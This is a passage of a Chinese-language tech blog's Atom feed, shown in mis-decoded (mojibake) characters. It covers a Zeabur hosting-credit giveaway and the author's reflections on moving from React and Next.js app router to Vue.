å‰µè¾¦äººèŠäº†ä¸€ä¸‹åˆä½œæ–¹å¼ï¼Œä»–å€‘ä¸€é–‹å§‹æçš„å°±æ˜¯æœ‰å„Ÿçš„å•†æ¥­åˆä½œæ–¹æ¡ˆï¼Œé€™é»å€¼å¾—é¼“å‹µï¼Œæˆ‘ä¹ŸèªåŒä¸»å‹•æ‰¾äººåˆä½œæ¨å»£æ˜¯è¦ä»˜è²»çš„ã€‚è€Œæˆ‘è‡ªå·±æå‡ºäº†ç”¨ Zeabur çš„ credit ä¾†æ›¿ä»£ç¾é‡‘çš„æ–¹å¼æ”¯ä»˜é…¬å‹ï¼Œä»–å€‘ä¹Ÿæ¬£ç„¶åŒæ„ã€‚</p><p>ä¸éæˆ‘ç›®å‰æ²’ä»€éº¼ service éœ€è¦è·‘ï¼Œå› æ­¤é€™äº› credit æˆ‘æ˜¯ç”¨ä¸å®Œçš„ï¼Œæœ‰é»æµªè²»ï¼Œæ‰€ä»¥å°±æ±ºå®šæŠŠé€™äº› credit å…¨éƒ¨å›é¥‹çµ¦è®€è€…ã€‚</p><p>å¦‚æœä½ æœ‰æœå‹™æƒ³è©¦è©¦çœ‹ Zeabur çš„ä»˜è²»æ–¹æ¡ˆï¼Œå¯ä»¥å¡«å¯«åº•ä¸‹é€™å€‹è¡¨å–®ï¼šï¼ˆæ´»å‹•å·²çµæŸï¼‰</p><p>æˆ‘æœƒå¾ä¸­æŒ‘é¸ 15 å€‹äººï¼Œæ¯å€‹äººè´ˆé€ 4 å€‹æœˆä¹Ÿå°±æ˜¯ 20 ç¾é‡‘çš„ä½¿ç”¨é¡åº¦ï¼Œå¸Œæœ›é€™äº›äººèƒ½å¤ åœ¨ä½¿ç”¨å®Œ Zeabur ä¹‹å¾Œå¯«ä¸€ç¯‡å¿ƒå¾—ï¼Œå¹«åŠ© Zeabur è®Šå¾—æ›´å¥½ã€‚é€™å€‹å¿ƒå¾—ä¸æ˜¯å¼·åˆ¶çš„ï¼Œå°±ç®—ä¸å¯«ä¹Ÿå¯ä»¥ï¼Œè€Œä¸”å…§å®¹ä¸é™ï¼Œè¦è¬›å„ªé»ç¼ºé»éƒ½å¯ä»¥ï¼Œéå¸¸è‡ªç”±ã€‚</p><p>è¡¨å–®é è¨ˆæœƒåœ¨ 4&#x2F;25 å·¦å³é—œé–‰ï¼Œå¦‚æœæœ‰è¢«é¸ä¸­çš„è©±ï¼Œæœƒåœ¨å››æœˆåº•çš„æ™‚å€™é€é email é€šçŸ¥ã€‚ç”±æ–¼åˆ°æ™‚å€™çå‹µæœƒç¶“ç”± email ç›´æ¥ç™¼æ”¾ï¼Œå› æ­¤éœ€è¦å…ˆè¨»å†Š Zeabur å†å¡«å¯«è¡¨å–®ã€‚å°±å¦‚åŒæˆ‘ä¸Šé¢èªªçš„ï¼Œé›–ç„¶æ˜¯å…è²»æ–¹æ¡ˆä½†é‚„æ˜¯å¯ä»¥éƒ¨ç½²ä¸€èˆ¬çš„ serverï¼Œå¤§å®¶å¯ä»¥å…ˆè¨»å†Šä¸€å€‹å¸³è™Ÿç©ç©çœ‹ï¼Œè¦ºå¾—å¥½ç”¨è€Œä¸”æƒ³è¦æŠŠæ›´å¤šæ±è¥¿æ”¾åœ¨ä¸Šé¢ï¼Œæ‰ä¾†å¡«å¯«è¡¨å–®åƒåŠ æ´»å‹•ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»¥å‰ç•¶æˆ‘æƒ³è¦éƒ¨ç½²ä¸€å€‹ç°¡å–®çš„æœå‹™æ™‚ï¼Œæˆ‘æœƒå» Heroku ä¸Šé¢ï¼Œå› ç‚ºç°¡å–®è€Œä¸”å…è²»ï¼Œé›–ç„¶èªªé‚„æ˜¯æœ‰äº›ä½¿ç”¨é™åˆ¶ï¼Œä½†æ•´é«”è€Œè¨€é‚„æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œç”šè‡³é‚„æœ‰ä¸€äº›ç°¡å–®çš„ DB å¯ä»¥ç”¨ã€‚å¦‚æœæ˜¯éœæ…‹ç¶²é ï¼Œæœƒé¸æ“‡ Netlify æˆ–æ˜¯ GitHub Pagesï¼Œä¹Ÿéƒ½æ˜¯ç°¡å–®æ–¹ä¾¿çš„é¸æ“‡ã€‚&lt;/p&gt;
&lt;p&gt;ä½† Heroku å¾ 2022 å¹´å¹´åº•ä¹‹å¾Œå°±ä¸å†æä¾›å…è²»æ–¹æ¡ˆäº†ï¼Œå› æ­¤é‚£æ™‚ä¸€å †äººåœ¨å°‹æ‰¾æ›¿ä»£æ–¹æ¡ˆï¼ŒåŒ…æ‹¬ Render æˆ–æ˜¯ fly[dot]io ç­‰ç­‰ï¼Œéƒ½æ˜¯å¾ˆå¤šäººè·³æ§½çš„æ–°é¸æ“‡ã€‚è€Œæˆ‘è‡ªå·±ä»¥å‰å…¶å¯¦åœ¨ Heroku ä¸Šä¹Ÿæœ‰ä¸‰å››å€‹å°ˆæ¡ˆï¼Œå¾ Heroku æ”¹è®Šæ–¹æ¡ˆä¹‹å¾Œå°±å†ä¹Ÿæ²’ä¹Ÿå‹•éäº†ã€‚&lt;/p&gt;
&lt;p&gt;å‰é™£å­æ”¶åˆ° &lt;a href=&quot;https://zeabur.com/zh-TW&quot;&gt;Zeabur&lt;/a&gt; å‰µè¾¦äººçš„ä¾†ä¿¡ï¼Œå¸Œæœ›æœ‰æ©Ÿæœƒèƒ½è·Ÿæˆ‘åˆä½œæ¨å»£é€™å€‹å¹³å°ï¼Œæˆ‘è‡ªå·±è©¦äº†ä¹‹å¾Œç™¼ç¾é«”é©—ç¢ºå¯¦å¾ˆä¸éŒ¯ï¼Œå› æ­¤å°±å¯«äº†é€™ç¯‡æ–‡ç« ä»‹ç´¹ä¸€ä¸‹ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://blog.huli.tw/categories/Web/"/>
    
    
    <category term="Web" scheme="https://blog.huli.tw/tags/Web/"/>
    
  </entry>
  
  
  
  <entry>
    <title>å¾ React åˆ° Vue çš„å¿ƒå¾—æ„Ÿæƒ³</title>
    <link href="https://blog.huli.tw/2024/03/13/from-react-to-vue/"/>
    <id>https://blog.huli.tw/2024/03/13/from-react-to-vue/</id>
    <published>2024-03-13T02:40:00.000Z</published>
    <updated>2024-03-13T11:10:27.551Z</updated>
    
    <content type="html"><![CDATA[<p>å¦‚æœæœ‰çœ‹éæˆ‘çš„éƒ¨è½æ ¼çš„è©±ï¼Œæ‡‰è©²æœƒçŸ¥é“æˆ‘ä¸€ç›´éƒ½æ˜¯å¯« Reactï¼Œå®Œå…¨æ²’æœ‰ç¢°é Vueï¼Œä¹Ÿæ²’æœ‰ç¢°é Angularã€‚è‡ªå¾ 2015 å¹´æ¥è§¸åˆ° React å¾Œï¼Œå·¥ä½œä¸Šå°±ä¸€ç›´æ˜¯ç”¨ React äº†ã€‚</p><p>ç„¶è€Œï¼Œæœ€è¿‘å› ç‚ºå·¥ä½œä¸Šçš„éœ€æ±‚ï¼Œæ‰€ä»¥é–‹å§‹å¯« Vue äº†ï¼Œè€Œå‰›å¥½ä¹Ÿæœ‰è®€è€…ä¾†å•æˆ‘å¾ React è·³åˆ° Vue çš„å¿ƒå¾—ï¼Œå› æ­¤é€™é‚Šå°±ç°¡å–®å¯«ä¸€ç¯‡ä¾†åˆ†äº«ã€‚</p><span id="more"></span><h2><span id="åœ¨é–‹å§‹ä¹‹å‰">åœ¨é–‹å§‹ä¹‹å‰â€¦</span></h2><p>é›–ç„¶èªªè¦è¬›å¾ React è·³åˆ° Vue çš„æ„Ÿæƒ³ï¼Œä½†å…ˆè®“æˆ‘å·æ¸¡ä¸€ä¸‹å°æ–¼ Next.js 13.4ï¼Œä¹Ÿå°±æ˜¯ app router æ­é… RSCï¼ˆReact Server Componentsï¼‰çš„æ„Ÿæƒ³ã€‚ç…§ç†ä¾†èªªæ‡‰è©²è¦é–‹å¦å¤–ä¸€ç¯‡çš„ï¼Œä½†ç¯‡å¹…ä¸å¤ é•·ï¼Œå› æ­¤å°±å·æ¸¡åœ¨é€™è£¡äº†ã€‚</p><p>å¦‚æœæ²’èˆˆè¶£çš„è©±ï¼Œå¯ä»¥ç›´æ¥è·³åˆ°ä¸‹ä¸€æ®µã€‚</p><p>åœ¨ç›®å‰çš„å…¬å¸ï¼ŒReact è·Ÿ Vue éƒ½æœƒç¢°åˆ°ï¼Œè€Œä¸”ç‰ˆæœ¬éƒ½æ»¿æ–°çš„ï¼Œå‰è€…æ˜¯ Next.js 14ï¼ˆå‰›ç”¨çš„æ™‚å€™æ˜¯ 13.4ï¼Œç¬¬ä¸€å€‹æœ‰ RSC çš„ç‰ˆæœ¬ï¼‰ï¼Œå¾Œè€…å‰‡æ˜¯ Vue3ã€‚</p><p>å› ç‚ºéƒ½ç”¨äº† Next.js çš„æœ€æ–°ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç›´ä¸Š RSCï¼Œæƒ³ä¾†é«”é©—é€™å€‹ React æœªä¾†çš„é‡é»æŠ€è¡“ä¹‹ä¸€ï¼Œå…ˆè¬›çµè«–ï¼šã€Œä¸èƒ½åªæœ‰æˆ‘å—è‹¦ï¼Œè¶•å¿«ä¾†ç”¨ã€ã€‚</p><p>ï¼ˆè©±èªªå¦‚æœé‚„ä¸æ¸…æ¥š RSC æ˜¯ä»€éº¼ï¼Œæˆ–æ˜¯å®¹æ˜“è·Ÿ SSR ææ··çš„è©±ï¼Œå»ºè­°å¯ä»¥å…ˆçœ‹é€™å…©ç¯‡æ–‡ç« ï¼š<a href="https://github.com/reactwg/server-components/discussions/5">RSC From Scratch. Part 1: Server Components</a> ä»¥åŠ <a href="https://vercel.com/blog/understanding-react-server-components">Understanding React Server Components</a>ï¼‰</p><p>æ ¹æ“š RSC çš„è¨­è¨ˆåŸå‰‡ï¼Œå¦‚æœé‹ç”¨å¾—ç•¶çš„è©±ï¼Œä½ çš„ bundle size æœƒè®Šå°ï¼Œç¶²ç«™çš„æ€§èƒ½ä¹Ÿå¯èƒ½æœƒè®Šå¥½ï¼Œä½†æˆ‘è‡ªå·±ç”¨éä¹‹å¾Œï¼Œèªç‚ºå®ƒå¸¶ä¾†çš„æ•ˆç›Šé ä½æ–¼å¼•é€²é€™é …æŠ€è¡“æ‰€å¢åŠ çš„è¤‡é›œåº¦ã€‚</p><p>ä¸éå…ˆå¼·èª¿ä¸€ä¸‹ï¼Œå› ç‚ºæˆ‘ç”¨çš„æ˜¯ Next.js çš„ RSCï¼Œä¸ä»£è¡¨æ‰€æœ‰çš„ RSC éƒ½æ˜¯åŒå€‹æ¨£å­ï¼Œæ‰€ä»¥é€™æ•´æ®µè¬›çš„éƒ½æœƒæ˜¯ã€ŒNext.js çš„ RSC çš„ä½¿ç”¨å¿ƒå¾—ã€ï¼Œè€Œä¸æ˜¯ã€ŒRSC çš„ä½¿ç”¨å¿ƒå¾—ã€ã€‚</p><p>å…ˆä¾†è¬›ç¼ºé»å¥½äº†ã€‚</p><p>é¦–å…ˆï¼Œå…‰æ˜¯è¦æ­£ç¢ºç†è§£ client component è·Ÿ server component å°±éœ€è¦ä¸€äº›æ™‚é–“ï¼Œå¯èƒ½æ˜¯å˜—è©¦çš„æ™‚é–“å¤ªæ—©ï¼Œç”šè‡³é€£ Next.js çš„å®˜æ–¹æ–‡ä»¶éƒ½å¯«å¾—ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œéœ€è¦è‡ªå·±ä¸€ç›´ä¸æ–·å˜—è©¦æ‰èƒ½è©¦å‡ºä¾†åˆ°åº•æ˜¯ä»€éº¼æ¨£å­ï¼ˆä¾‹å¦‚èªªä¹‹å‰å‰ç«¯ç¤¾ç¾¤æœ‰ä¸€ç¯‡<a href="https://www.facebook.com/groups/f2e.tw/posts/6773381989365775/">è²¼æ–‡</a>å°±åœ¨å•é€™å€‹ï¼Œæˆ‘ç•¶åˆä¹Ÿæœ‰é¡ä¼¼çš„ç–‘æƒ‘ï¼‰ã€‚</p><p>å†ä¾†çš„è©±ï¼Œæœªä¾†åœ¨å¯« component çš„æ™‚å€™éƒ½æœƒéœ€è¦è€ƒæ…®åˆ°é€™å€‹æ˜¯ client é‚„æ˜¯ server é‚„æ˜¯éƒ½å¯ä»¥ï¼Œæœƒå¢åŠ å¿ƒæ™ºè² æ“”ã€‚</p><p>é‚„æœ‰å°±æ˜¯è¨±å¤š server component å¯èƒ½æœƒç›´æ¥æ‰“ API å»æ‹¿è³‡æ–™ï¼Œå› æ­¤ client åœ¨æ‹¿åˆ°è³‡æ–™æ™‚ï¼Œå°±å·²ç¶“æ˜¯ render å¥½çš„çµæœäº†ã€‚é›–ç„¶ä¹çœ‹ä¹‹ä¸‹ä¸éŒ¯ï¼ˆç•¢ç«Ÿæ˜¯ RSC çš„è³£é»ï¼‰ï¼Œä½†é€™å…¶å¯¦æœƒè®“å‰ç«¯è®Šå¾—å¾ˆé›£ debugã€‚</p><p>ä»¥å‰é™¤äº†ç¬¬ä¸€æ¬¡çš„ SSR ä»¥å¤–ï¼Œæˆ‘åªè¦æ‰“é–‹ DevToolsï¼Œå°±å¯ä»¥çœ‹åˆ°å‰ç«¯ç™¼äº†å“ªäº›è«‹æ±‚ï¼ŒAPI çš„ response æ˜¯ä»€éº¼ï¼Œä½†æ›æˆ server component ä»¥å¾Œæˆ‘çœ‹ä¸åˆ°äº†ï¼Œæˆ‘åªèƒ½çœ‹ server log æ‰èƒ½çŸ¥é“ç™¼ç”Ÿäº†ä»€éº¼äº‹æƒ…ã€‚</p><p>å¦‚æœå‡ºäº‹çš„è©±ï¼Œæˆ‘å¾å‰ç«¯æ²’è¾¦æ³•å€åˆ†å‡ºæ˜¯æˆ‘çš„ Next.js server å‡ºéŒ¯ï¼Œé‚„æ˜¯æˆ‘å‘¼å«çš„ API é‚£é‚Šå‡ºéŒ¯ï¼Œé€™é»åœ¨é–‹ç™¼è€…é«”é©—ä¸Šæ‰£åˆ†è¨±å¤šã€‚</p><p>ä½†ä»¥ä¸Šé€™äº›å…¶å¯¦éƒ½é‚„å¥½ï¼Œæœ€é›·çš„æ˜¯ Next.js 13.4 çš„æ¨å‡ºæœ‰é»å¤ªè¶•ï¼Œè¦å˜›å¾ˆå¤šåŠŸèƒ½éƒ½æ²’æœ‰åšå¥½ï¼Œè¦å˜›æ˜¯æ–‡ä»¶æ²’æœ‰å¯«æ¸…æ¥šã€‚</p><p>èˆ‰ä¾‹ä¾†èªªï¼ŒNext.js æœ‰ä¸€å€‹å«åš middleware çš„æ±è¥¿ï¼Œå¾ˆç›´è¦ºå°±æœƒç†è§£æˆæ˜¯ä¸€å€‹åœ¨è™•ç† request ä¹‹å‰æœƒåŸ·è¡Œåˆ°çš„æª”æ¡ˆã€‚ä½†æ–‡ä»¶æ²’æœ‰å¯«æ¸…æ¥šçš„æ˜¯ï¼Œé€™å€‹ middleware è·Ÿä½ å…¶ä»–çš„ç¨‹å¼ç¢¼ï¼Œæ˜¯è·‘åœ¨ä¸åŒçš„åŸ·è¡Œç’°å¢ƒçš„ï¼ˆç¾åœ¨æˆ‘è¨˜å¾—å·²ç¶“æœ‰è£œä¸Šäº†ï¼ŒNext.js çš„æ”¹ç‰ˆä¹Ÿæ»¿å‹¤å¿«çš„å°±æ˜¯äº†ï¼‰ã€‚</p><p>ä¹Ÿå°±æ˜¯èªªåœ¨ middleware è£¡é¢å¯«ä¸€å€‹ <code>global.a = 1</code>ï¼Œä½ åˆ° Next.js çš„ server component è£¡é¢ log å‡º <code>global.a</code>ï¼Œç­”æ¡ˆæœƒæ˜¯ undefinedã€‚</p><p>å†è€…ï¼Œmiddleware ä¸¦ä¸æ˜¯è·‘åœ¨å®Œæ•´çš„ Node.js ç’°å¢ƒä¸Šé¢ï¼Œè€Œæ˜¯è·‘åœ¨ä¸€å€‹å«åš <a href="https://nextjs.org/docs/app/building-your-application/rendering/edge-and-nodejs-runtimes">Edge Runtime</a> çš„åœ°æ–¹ï¼Œæœ‰è¨±å¤šçš„åŠŸèƒ½è·Ÿ API éƒ½ä¸æ”¯æ´ã€‚</p><p>ä¹‹æ‰€ä»¥é€™æ¨£æï¼Œæ˜¯å› ç‚º Next.js é è¨­äº†é€™å€‹ middleware å°±æ˜¯è¦è·‘åœ¨ edge ä¸Šï¼Œå°±ç®—æˆ‘å€‘æ ¹æœ¬ä¸æœƒç”¨åˆ° edge é€™å€‹åŠŸèƒ½ä¹Ÿä¸€æ¨£ï¼Œè€Œä¸”ç›®å‰ä¾ç„¶æ²’è¾¦æ³•æ”¹è®Šé€™é»ï¼Œæ›´å¤šè¨è«–å¯ä»¥çœ‹é€™ä¸€ä¸²ï¼š<a href="https://github.com/vercel/next.js/discussions/46722">Switchable Runtime for Middleware (Allow Node.js APIs in Middleware) #46722</a>ã€‚</p><p>é †å¸¶ä¸€æï¼Œæˆ‘ç›®å‰å®Œå…¨ä¸æ”¯æŒæŠŠ Next.js ç•¶ä¸€å€‹å…¨ç«¯æ¡†æ¶ä¾†ç”¨ï¼Œä¹Ÿå°±æ˜¯å‰å¾Œç«¯å°ˆæ¡ˆå…¨éƒ½æ›åœ¨ Next.js ä¸Šï¼Œç†ç”±å¾ˆç°¡å–®ï¼Œé‚£å°±æ˜¯å®ƒæœ¬ä¾†å°±ä¸é©åˆé€™æ¨£ç”¨ã€‚Next.js å®ƒæ‰€æä¾›çš„ server ç›®å‰æ›´åƒæ˜¯ BFFï¼ˆBack-end For Front-endï¼‰ï¼Œå¯ä»¥ç•¶ä½œå‰ç«¯è·Ÿå…¶ä»–å¾Œç«¯çš„æ©‹æ¨‘ï¼Œä½†æ²’è¾¦æ³•è‡ªå·±å¯¦ä½œå‡ºå®Œæ•´çš„åŠŸèƒ½ï¼ˆé™¤éä½ çš„å°ˆæ¡ˆå¾ˆå°ï¼ŒåŠŸèƒ½å¾ˆå°‘ï¼‰ã€‚</p><p>å¦‚æœçœŸçš„æŠŠå¾Œç«¯åŠŸèƒ½æ¬åˆ° Next.js ä¸Šï¼Œé‚£æ³¨å®šæ˜¯å ´æ‚²åŠ‡ã€‚</p><p>è¬›å®Œäº†ç¼ºé»ï¼Œä¾†è¬›è¬›å„ªé»ï¼Œé‚£å¤§æ¦‚å°±æ˜¯ bundle size çœŸçš„æœ‰å°ä¸€é»ã€‚ä¾‹å¦‚èªª i18n å¥½äº†ï¼Œä»¥å¾€æ²’æœ‰ç‰¹åˆ¥åšä»€éº¼èª¿æ•´çš„è©±ï¼Œå¤§éƒ¨åˆ†çš„ client éƒ½æœƒä¸‹è¼‰åˆ°ã€Œè¶…å‡ºç›®å‰ä½¿ç”¨ç¯„åœä»¥å¤–ã€çš„å­—ä¸²ï¼Œä¾‹å¦‚èªªæ‰€æœ‰çš„ä¸­æ–‡å­—ä¸²ï¼Œæˆ–è‡³å°‘æ˜¯ç•¶å‰ namespace åº•ä¸‹çš„å­—ä¸²ã€‚</p><p>ä½†ç”¨äº† RSC ä»¥å¾Œï¼Œç”±æ–¼ server component çš„ i18n åœ¨ server ç›´æ¥åšæ‰äº†ï¼Œæ‰€ä»¥é€™éƒ¨åˆ†å°±ä¸éœ€è¦ä¸‹è¼‰ä»»ä½•é¡å¤–çš„å­—ä¸²ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œå…¶å¯¦æˆ‘æ²’é«”é©—åˆ°å¤ªå¤§çš„å¥½è™•ï¼ˆè€Œä¸”å› ç‚ºå…¬å¸å°ˆæ¡ˆçš„ä¸€äº›ç‰¹æ€§ï¼Œåœ¨æ­é…ä¸ŠåŒæ™‚æœ‰ client è·Ÿ server component éœ€è¦è€ƒæ…®ï¼Œç¾æœ‰çš„ i18n å¥—ä»¶æ¯ä¸€å€‹éƒ½æœ‰å•é¡Œï¼Œåªå¥½è‡ªå·±ç°¡å–®åšäº†ä¸€å¥—ï¼‰</p><p>ç¸½ä¹‹å‘¢ï¼Œæˆ‘å€‹äººæ˜¯ä¸å¤ªæ¨è–¦ä½¿ç”¨ app router çš„ï¼Œå¸¶ä¾†çš„æ•ˆç›Šé ä½æ–¼å°å…¥çš„æˆæœ¬ï¼Œé‚„æœƒæŠŠå¾ˆå¤šäº‹æƒ…å¼„å¾—æ›´è¤‡é›œã€‚æˆ‘æ˜¯å¾å»å¹´ä¸ƒå…«æœˆå°±é–‹å§‹ç”¨ Next.js 13.4 äº†ï¼Œé‚£æ™‚å€™çš„ç‹€æ³æ›´ç³Ÿï¼Œæ–‡ä»¶è·Ÿç¨‹å¼ç¢¼çš„è¡Œç‚ºé…å°ä¸ä¸Šçš„äº‹æƒ…ä¹Ÿç™¼ç”Ÿéã€‚</p><p>å¦‚æœæœ‰äººè·Ÿæˆ‘èªª Next.js 13.4 ä»¥å¾Œçš„ app router è¶…å¥½ç”¨ï¼Œé‚£æˆ‘æœƒè¦ºå¾—è¦å˜›æ˜¯ç”¨å¾—ä¸å¤ å¤šï¼Œè¦å˜›æ˜¯å°ˆæ¡ˆå¾ˆå°ï¼Œæ‰€ä»¥æ²’æœ‰é«”é©—åˆ°å£è™•ï¼Œæ›´ä½•æ³æˆ‘éƒ½é‚„æ²’è¬›é‚£ä¸€å †é è¨­é–‹å•Ÿè€Œä¸”æœ‰äº›é—œä¸æ‰çš„<a href="https://nextjs.org/docs/app/building-your-application/caching">å¿«å–ç­–ç•¥</a>ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯å·æ¸¡çš„ Next.js RSC å¿ƒå¾—ï¼Œå› ç‚ºå¾å»å¹´ä¸ƒå…«æœˆå°±é–‹å§‹ç”¨äº†ï¼Œå…¶å¯¦å‰›ç”¨çš„é‚£å…©ä¸‰å€‹æœˆæœ€æœ‰æ„Ÿï¼ŒçœŸçš„å¾ˆå¤šé»å¯ä»¥åæ§½ï¼Œä½†ç¾åœ¨å·²ç¶“æœ‰é»å¿˜äº†ï¼Œæˆ‘ä¹Ÿå®³æ€•æƒ³èµ·ä¾†ã€‚</p><h2><span id="å¾å¯«-react-è½‰å»å¯«-vue-çš„æ„Ÿæƒ³">å¾å¯« React è½‰å»å¯« Vue çš„æ„Ÿæƒ³</span></h2><p>è©±èªªé€™ç¯‡æœƒç›¡é‡å¯«çš„æ˜¯ React èˆ‡ Vue æœ¬èº«çš„å¿ƒå¾—ï¼Œè€Œä¸æ˜¯ç‰¹å®šçš„å‡½å¼åº«æˆ–æ¡†æ¶ã€‚</p><p>èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘åŸæœ¬åœ¨ React éƒ½æ˜¯ç”¨ Reduxï¼Œè½‰åˆ° Vue ä¹‹å¾Œç”¨ Piniaï¼Œç„¶å¾Œå¯«èªªï¼šã€Œå“‡ï¼Œå¯« Vue çœŸçš„å¤ªæ£’äº†å•¦ï¼ŒPinia å¥½ç°¡æ½”å¥½å¥½ç”¨ï¼Œæ¯” React å¥½å¤ªå¤šäº†ã€ï¼Œé€™å€‹è«–è¿°æ˜¯æœ‰å•é¡Œçš„ï¼Œå› ç‚ºåœ¨ React åœˆå…¶å¯¦ä¹Ÿæœ‰é¡ä¼¼çš„ zustand å¯ä»¥ç”¨ã€‚</p><p>æ‰€ä»¥é€™ä¸€å¥åœ¨æ¯”è¼ƒçš„ä¸»é«”ä¸¦ä¸æ˜¯ Vue èˆ‡ Reactï¼Œè€Œæ˜¯ Redux èˆ‡ Piniaï¼Œè®Šæˆäº†ç‰¹å®šå‡½å¼åº«çš„æ¯”è¼ƒï¼Œé€™æ˜¯é€™ä¸€ç¯‡æƒ³è¦é¿é–‹çš„è«–è¿°ã€‚</p><p>ä¸éç‚ºäº†è£œå……è„ˆçµ¡ï¼Œé‚„æ˜¯å…ˆæŠŠé€™äº›å‡½å¼åº«èˆ‡æ¡†æ¶ç¨å¾®è¬›ä¸€ä¸‹å¥½äº†ï¼ŒReact çš„è©±ç›®å‰æˆ‘çš„èµ·æ‰‹å¼å¤§æ¦‚å°±æ˜¯ Next.js æ­é… Zustand æ­é… tailwindï¼Œè€Œ Vue çš„è©±å°±æ˜¯ Nuxt æ­é… Pinia æ­é… tailwindã€‚</p><p>ä»¥ä½¿ç”¨é«”é©—ä¾†èªªï¼Œæˆ‘è¦ºå¾—å…©å€‹æ˜¯å·®ä¸å¤šçš„ï¼ˆå¦‚æœ Next.js æ˜¯ page router çš„è©±ï¼‰ï¼Œæ‰€ä»¥é€™éƒ¨åˆ†å°±ä¸å¤šæäº†ã€‚</p><p>å†ä¾†ï¼Œä½¿ç”¨çš„æ„Ÿæƒ³æœƒèˆ‡ä½¿ç”¨ç¶“é©—å¤šå¯¡ä»¥åŠæ‡‰ç”¨çš„å°ˆæ¡ˆæœ‰å·®ï¼Œç›®å‰æ‰‹é‚Šå¤§ç´„æœ‰ 4 å€‹å…§éƒ¨çš„ä¸­å°å‹å°ˆæ¡ˆéƒ½ç”¨åˆ° Vueï¼Œæˆ‘å¯« Vue å¤§æ¦‚å¯«äº†å››å€‹æœˆå·¦å³ï¼Œå…¶å¯¦ä¹Ÿæ²’æœ‰å¾ˆé•·ï¼Œå¦å¤–å› ç‚ºæ˜¯å…§éƒ¨å·¥å…·ï¼Œæ‰€ä»¥éƒ½æ²’æœ‰é–‹å•Ÿ SSRï¼Œç›´æ¥èµ°ç´” client side renderã€‚</p><p>è¬›å®Œäº†é€™äº›å‰æä»¥å¾Œï¼Œæ¥è‘—å°±ä¾†è¬›è¬›ä½¿ç”¨çš„æ„Ÿæƒ³ï¼Œå…ˆä¾†è¬›æˆ‘è‡ªå·±æ¯”è¼ƒå–œæ­¡ Vue çš„åœ°æ–¹ã€‚</p><p>å…ˆè¬›ä¸€ä¸‹ç‹€æ…‹ç®¡ç†çš„éƒ¨åˆ†ã€‚</p><p>é¦–å…ˆæ˜¯ Vue çš„é›™å‘ç¶å®šçœŸçš„æ»¿é¦™çš„ï¼Œv-model çœŸçš„å¥½ç”¨ã€‚ä»¥å¾€åœ¨ React éƒ½æ˜¯ value + onChange éƒ½å¯«ï¼Œç¾åœ¨ç”¨ v-model ä¸€è¡Œå°±æå®šäº†ã€‚</p><p>è€Œå·®ç•°æœ€å¤§çš„æˆ‘è¦ºå¾—åœ¨æ–¼ useEffectã€‚åœ¨ React ä¸­éœ€è¦å¤§é‡ç”¨åˆ° useEffect å»è™•ç†ä¸€äº›äº‹æƒ…ï¼Œç„¶å¾Œè¦è€ƒæ…®åˆ° dependency ä»¥åŠå„ç¨®ç‹€æ³ï¼Œä¸€ä¸å°å¿ƒå°±å¯èƒ½å¯«å£ã€‚</p><p>ä½†æ˜¯åœ¨ Vue ä¸­å°±æ²’æœ‰é€™ç¨®å›°æ“¾ï¼Œçœäº†å¾ˆå¤šå¿ƒæ™ºè² æ“”ï¼Œä½ è¦å¯«å£å…¶å¯¦æ»¿é›£çš„ã€‚</p><p>è€Œé€™å€‹ç‰¹æ€§çš„å·®ç•°ï¼Œä¹Ÿè®“æˆ‘å°æ–¼å°ˆæ¡ˆçš„æŠ€è¡“é¸æ“‡å¤šäº†ä¸€å€‹æ€è€ƒçš„ç¶­åº¦ï¼Œé‚£å°±æ˜¯ã€Œä¸‹é™ã€ã€‚ä»¥å‰æˆ‘åœ¨æ€è€ƒæŠ€è¡“æ™‚ï¼Œæ¯”è¼ƒå®¹æ˜“æ€è€ƒåˆ°ã€Œä¸€èˆ¬çš„ä½¿ç”¨ç‹€æ³ã€ï¼Œåƒæ˜¯æˆ‘å¯« React å¯«ä¹…ä¹‹å¾Œï¼Œå…¶å¯¦ä¸æœƒç‰¹åˆ¥è¦ºå¾— useEffect æœ‰ä»€éº¼ï¼Œå¯«å¾—ä¹Ÿç®—æ˜¯é †æ‰‹ã€‚</p><p>ä½†åŒæ™‚æˆ‘ä¹Ÿæ‰¿èª useEffect æ˜¯ä¸€å€‹éœ€è¦ç¶“é©—æ‰èƒ½å¯«å¥½çš„æ±è¥¿ï¼Œæœ‰ä¸€å®šçš„å­¸ç¿’é–€æª»ï¼Œé€™ä¹Ÿè¡¨ç¤ºå®ƒçš„ä¸‹é™å¯ä»¥å¾ˆä½ã€‚å¯«å¾—çˆ›çš„å·¥ç¨‹å¸«ï¼Œå¯ä»¥å¯«ä¸€å † useEffect ç„¶å¾Œ dependency äº‚å¯«å»ç¶­æŒä¸€å€‹ææ€–å¹³è¡¡ï¼Œæ±è¥¿å‰›å¥½å¯ä»¥å‹•ã€‚è‹¥å¹²å¹´å¾Œå¦‚æœæˆ‘å»æ¥æ‰‹ï¼Œæˆ‘æœƒä¸çŸ¥é“å¾ä½•æ”¹èµ·ï¼Œå› ç‚ºåªè¦ä¸€å¾€è£¡é¢åŠ æ±è¥¿ï¼Œå°±æ˜¯æ•´å€‹å£æ‰ï¼Œè€Œä¸”é‚„æ˜¯å¤šå€‹ effect ä¸€èµ·å£æ‰ã€‚</p><p>ä½†æˆ‘è‡ªå·±è¦ºå¾— Vue å°±ä¸åŒäº†ï¼Œä½ å¯«å¾—å†æ€éº¼çˆ›ä¹Ÿå°±é‚£æ¨£äº†ã€‚åŒæ¨£éƒ½æ˜¯ä¸€å€‹æŠ€è¡“èƒ½åŠ›å¾ˆå·®çš„äººä¾†å¯«ï¼Œä»–æ‰€å¯«çš„ Vue æœƒæ¯” React å¥½ç¶­è­·ï¼Œæˆ‘æ˜¯é€™éº¼èªç‚ºçš„ï¼Œé€™å°±æ˜¯æˆ‘æ‰€èªªçš„ã€Œä¸‹é™ã€ã€‚</p><p>é‚£å¦‚æœç¾åœ¨æœ‰å€‹æ–°çš„åœ˜éšŠï¼Œè£¡é¢éƒ½æ˜¯å‰ç«¯è¶…ç´šæ–°æ‰‹ï¼Œä»–å€‘å¯«çš„å°ˆæ¡ˆä½ 